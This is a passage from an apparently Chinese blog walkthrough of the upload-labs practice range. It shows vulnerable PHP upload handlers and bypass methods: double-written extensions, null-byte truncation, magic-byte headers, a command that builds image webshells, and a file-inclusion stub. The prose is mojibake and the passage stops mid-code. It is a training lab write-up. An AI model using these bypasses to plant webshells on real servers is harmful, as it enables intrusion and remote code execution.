class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v9">ç»•è¿‡æ–¹å¼</h4>
<h5 id="ç‚¹-ç©ºæ ¼-ç‚¹ç»•è¿‡">ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡</h5>
<p>å®ƒå»é™¤äº†æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œå»é™¤äº†æ–‡ä»¶åå°¾ç©ºæ ¼ï¼Œè¿˜å»é™¤äº†::$DATAï¼Œä½†æ˜¯ä»â€œåŒå†™â€çš„æ€æƒ³å‡ºå‘ï¼Œä»£ç çš„é€»è¾‘æ˜¯å…ˆåˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œå†å»é™¤å­—ç¬¦ä¸²::$DATAï¼Œæœ€åé¦–å°¾å»ç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç‚¹+ç©ºæ ¼+ç‚¹çš„æ–¹å¼ç»•è¿‡ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨Burpå°†æ–‡ä»¶åæ”¹ä¸º<code>xx.php. .</code>ã€‚</p>
<blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä»ç¬¬ä¸‰å…³åˆ°ç¬¬ä¹å…³ï¼Œå¦‚æœç›®æ ‡æœåŠ¡å™¨æ˜¯windowsç³»ç»Ÿçš„è¯ï¼Œå‡å¯ç”¨ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡ã€‚</p>
</blockquote>
<h3 id="Pass-10-åˆ©ç”¨åŒå†™ç»•è¿‡">Pass-10 åˆ©ç”¨åŒå†™ç»•è¿‡</h3>
<h4 id="ä»£ç -v10">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">&quot;&quot;</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v10">ç»•è¿‡æ–¹å¼</h4>
<h5 id="åŒå†™ç»•è¿‡">åŒå†™ç»•è¿‡</h5>
<p>å…ˆåˆ†æä¸‹ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°é—®é¢˜å‡ºç°åœ¨ç¬¬8è¡Œçš„<code>str_ireplace()</code>å‡½æ•°ï¼Œæ­¤å‡½æ•°åœ¨æ­¤çš„ä½œç”¨æ˜¯å¯¹<code>$file_name</code>å˜é‡ä¸­å«æœ‰<code>$deny_ext</code>å†…å®¹çš„éƒ¨åˆ†æ›¿æ¢ä¸ºç©ºï¼Œä½†æ˜¯æ­¤æ“ä½œåªæ‰§è¡Œä¸€æ¬¡ã€‚â€œåªæ‰§è¡Œä¸€æ¬¡â€å°±æ˜¯é—®é¢˜æ‰€åœ¨ï¼Œå¦‚æœæˆ‘ä»¬ä¸Šä¼ ç±»ä¼¼<code>test.pphphp</code>è¿™æ ·çš„æ–‡ä»¶ï¼Œä¸Šä¼ åæ–‡ä»¶ä¼šè‡ªåŠ¨è¢«ä¿®æ”¹ä¸º<code>test.php</code>è¿›è€ŒæˆåŠŸä¸Šä¼ shellã€‚</p>
<h3 id="Pass-11-åˆ©ç”¨-00æˆªæ–­ç»•è¿‡">Pass-11 åˆ©ç”¨%00æˆªæ–­ç»•è¿‡</h3>
<h4 id="ä»£ç -v11">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v11">ç»•è¿‡æ–¹å¼</h4>
<h5 id="00ç»•è¿‡">%00ç»•è¿‡</h5>
<p>åˆ†æä»£ç å‘ç°æœ€ç»ˆè¿”å›çš„å›¾ç‰‡é“¾æ¥æ˜¯â€œå­˜å‚¨è·¯å¾„å+é‡å‘½ååçš„æ–‡ä»¶åâ€ï¼Œçœ‹åˆ°è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥è”æƒ³åˆ°ä½¿ç”¨%00æˆªæ–­è·¯å¾„ã€‚</p>
<blockquote>
<p>æˆªæ–­æ¡ä»¶ï¼š<br>
1ã€phpç‰ˆæœ¬å°äº5.3.4<br>
2ã€php.iniçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129202250.png" alt=""></p>
<h3 id="Pass-12-åˆ©ç”¨0x00æˆªæ–­ç»•è¿‡">Pass-12 åˆ©ç”¨0x00æˆªæ–­ç»•è¿‡</h3>
<p>è¿™é‡Œä»£ç ä¸ä¸Šé¢Pass-11ä»£ç ç±»ä¼¼ï¼Œä¸è¿‡æ˜¯save_pathå‚æ•°ç”±GETä¼ å…¥å˜ä¸ºPOSTä¼ å…¥ï¼Œåˆ©ç”¨åŸç†ä¹Ÿæ˜¯00æˆªæ–­ã€‚æ•…è¿™é‡Œä¸å†å™è¿°.</p>
<h3 id="Pass-13-åˆ©ç”¨å›¾ç‰‡é©¬ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹">Pass-13 åˆ©ç”¨å›¾ç‰‡é©¬ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹</h3>
<h4 id="ä»£ç -v12">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">&quot;C2chars&quot;</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">&#x27;chars1&#x27;</span>].$strInfo[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    $fileType = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v12">ç»•è¿‡æ–¹å¼</h4>
<h5 id="GIF89a">GIF89a</h5>
<p>åˆ†æä¸‹ä»£ç ï¼Œå‘ç°æ­¤å¤„å°±æ˜¯å¯¹æ–‡ä»¶å¤´è¿›è¡Œäº†è§£æï¼Œæ­¤æ—¶åªéœ€è¦ä¸Šä¼ å›¾ç‰‡é©¬æˆ–è€…åœ¨test.phpæ–‡ä»¶çš„å¼€å¤´åŠ ä¸ŠGIF89aå³å¯ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129205131.png" alt=""></p>
<p>ä¸ºäº†æ£€æµ‹å›¾ç‰‡é©¬æ˜¯å¦èƒ½æ­£å¸¸åˆ©ç”¨ï¼Œè¿™é‡Œåœ¨uploadç›®å½•ä¸­æ”¾ç½®ä¸ªæ–‡ä»¶åŒ…å«æ–‡ä»¶ï¼ŒfileInclude.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">include</span>($_GET[<span class="string">&#x27;file&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å†ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œä¸Šä¼ çš„shellï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129205956.png" alt=""></p>
<h5 id="Windowså‘½ä»¤">Windowså‘½ä»¤</h5>
<p>åœ¨Windowsä¸‹ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯åˆ¶ä½œå›¾ç‰‡ä¸€å¥è¯æœ¨é©¬ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy normal.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç”¨WinHexæ‰“å¼€ç”Ÿæˆçš„å›¾ç‰‡é©¬å°±å¯ä»¥çœ‹åˆ°æ’å…¥çš„PHPä»£ç äº†ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129210120.png" alt=""></p>
<h5 id="æ‰‹å·¥æ·»åŠ æ–‡ä»¶å¤´">æ‰‹å·¥æ·»åŠ æ–‡ä»¶å¤´</h5>
<p>é’ˆå¯¹æ–‡ä»¶å¤´çš„æ£€æµ‹ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹å·¥æ·»åŠ å„ç§æ ¼å¼æ–‡ä»¶çš„æ–‡ä»¶å¤´æ¥ç»•è¿‡ã€‚</p>
<p>æ¯”å¦‚å›¾ç‰‡ç±»å‹çš„æ–‡ä»¶å¹»æ•°å¦‚ä¸‹ï¼š</p>
<p>JPGæ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129210209.png" alt=""></p>
<p>GIFæ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129210224.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129210237.png" alt=""></p>
<p>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨Burpä¸­æ‹¦æˆªæŠ¥æ–‡æ‰‹å·¥åœ¨Hexæ ä¸­åœ¨PHPæœ¨é©¬ä»£ç å‰æ·»åŠ ä¸ŠJPGçš„æ–‡ä»¶å¤´ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129210347.png" alt=""></p>
<h3 id="Pass-14-åˆ©ç”¨å›¾ç‰‡é©¬ç»•è¿‡getimagesize">Pass-14 åˆ©ç”¨å›¾ç‰‡é©¬ç»•è¿‡getimagesize()</h3>
<h4 id="ä»£ç -v13">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    $types = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v13">ç»•è¿‡æ–¹å¼</h4>
<p>PHPå‡½æ•°<code>getimagesize()</code>å¯ä»¥è·å–å›¾ç‰‡çš„å®½ã€é«˜ç­‰ä¿¡æ¯ï¼Œå¦‚æœä¸Šä¼ çš„ä¸æ˜¯å›¾ç‰‡æ–‡ä»¶ï¼Œé‚£ä¹ˆ<code>getimagesize()</code>å°±è·å–ä¸åˆ°ä¿¡æ¯ï¼Œåˆ™ä¸å…è®¸ä¸Šä¼ ã€‚è€Œ<code>image_type_to_extension()</code>å‡½æ•°åˆ™æ ¹æ®å›¾åƒç±»å‹è¿”å›å¯¹åº”çš„åç¼€åã€‚</p>
<p>å’ŒPass-13ç›¸ä¼¼ï¼Œä½¿ç”¨æ–‡ä»¶åˆæˆå‘½ä»¤ç”Ÿæˆå›¾ç‰‡é©¬ã€‚</p>
<h3 id="Pass-15-åˆ©ç”¨å›¾ç‰‡é©¬ç»•è¿‡exif-imagetype">Pass-15 åˆ©ç”¨å›¾ç‰‡é©¬ç»•è¿‡exif_imagetype()</h3>
<h4 id="ä»£ç -v14">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡æ–¹å¼-v14">ç»•è¿‡æ–¹å¼</h4>
<p>exif_imagetype()ï¼šè¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚</p>
<p>åŒPass-13ç”Ÿæˆå›¾ç‰‡é©¬ä¸Šä¼ ç»•è¿‡ã€‚</p>
<blockquote>
<p>get_imagesize()å’Œexif_imagetype()å¯¹ä¸Šä¼ çš„å›¾ç‰‡æ£€æŸ¥æœ‰ä½•ä¸åŒï¼š</p>
<p>é€šè¿‡è°ƒç”¨exif_imagetype()å‡½æ•°åˆ¤æ–­å›¾åƒç±»å‹çš„æ–¹æ³•æ›´å…·æœ‰å®¹é”™æ€§ã€èƒ½å¤Ÿå¯¹æ— æ³•æ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡é©¬è¿›è¡Œæ­£å¸¸å¤„ç†ï¼›è€Œé€šè¿‡è°ƒç”¨getimagesize()å‡½æ•°å’Œimage_type_to_extension()å‡½æ•°æ¥è·å–å›¾åƒç±»å‹å¹¶è®¾ç½®åç¼€åçš„æ–¹æ³•æ˜¯æ²¡åŠæ³•å¯¹æ— æ³•æ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡é©¬è¿›è¡Œæ­£å¸¸å¤„ç†çš„ã€‚</p>
</blockquote>
<h3 id="Pass-16-äºŒæ¬¡æ¸²æŸ“ç»•è¿‡">Pass-16 äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</h3>
<h4 id="ä»£ç -v15">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span 